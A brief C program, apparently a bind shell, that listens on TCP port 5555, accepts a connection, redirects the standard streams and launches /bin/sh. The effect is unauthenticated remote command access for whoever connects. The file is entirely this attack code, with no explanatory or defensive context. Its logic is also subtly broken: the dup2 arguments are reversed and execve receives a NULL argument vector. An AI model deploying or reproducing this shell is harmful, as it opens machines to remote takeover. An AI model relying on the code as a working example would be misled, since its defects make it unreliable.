 
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>

int main(void){
    int descriptorSocket, descriptorAccept, descriptorStdin, descriptorStdout, descriptorStderr;
    int errBind, errListen;
    descriptorSocket=socket(AF_INET, SOCK_STREAM, 0);
    if(descriptorSocket<0){
        printf("ERROR creando socket!");
    }
    
    struct sockaddr_in server_addr;
    server_addr.sin_family=AF_INET;
    server_addr.sin_port=htons(5555);
    server_addr.sin_addr.s_addr=INADDR_ANY;
    errBind=bind(descriptorSocket, (struct sockaddr *)&server_addr, sizeof(server_addr));
    
    errListen=listen(descriptorSocket, 0);
    
    descriptorAccept=accept(descriptorSocket, NULL, NULL);
    
    descriptorStdin=dup2(STDIN_FILENO, descriptorAccept);
    if(descriptorStdin<0){
        printf("ERROR dup stdin");
    }
    descriptorStdout=dup2(STDOUT_FILENO, descriptorAccept);
    if(descriptorStdout<0){
        printf("ERROR dup stdout");
    }
    descriptorStderr=dup2(STDERR_FILENO, descriptorAccept);
    if(descriptorStderr<0){
        printf("ERROR dup stderr");
    }
    
    execve("/bin/sh", NULL, NULL);
    
    return 0;
}
